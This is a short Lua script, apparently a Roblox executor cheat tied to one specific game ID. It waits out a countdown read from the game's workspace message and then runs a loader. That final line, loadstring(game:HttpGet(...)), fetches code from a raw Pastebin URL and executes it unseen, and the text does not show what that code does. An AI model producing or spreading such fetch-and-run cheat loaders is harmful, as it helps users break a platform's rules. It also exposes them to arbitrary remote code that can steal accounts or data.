repeat wait() until game:IsLoaded()

if game.PlaceId == 5411459567 then

local message = game:GetService("Workspace"):WaitForChild("Message").Text
local number = message:match("%d+")
local number = tonumber(number)

if number < getgenv().MaxTime then
    wait(number + getgenv().PayoutDelay)
end

loadstring(game:HttpGet("https://pastebin.com/raw/qc2SwaaA"))()

end
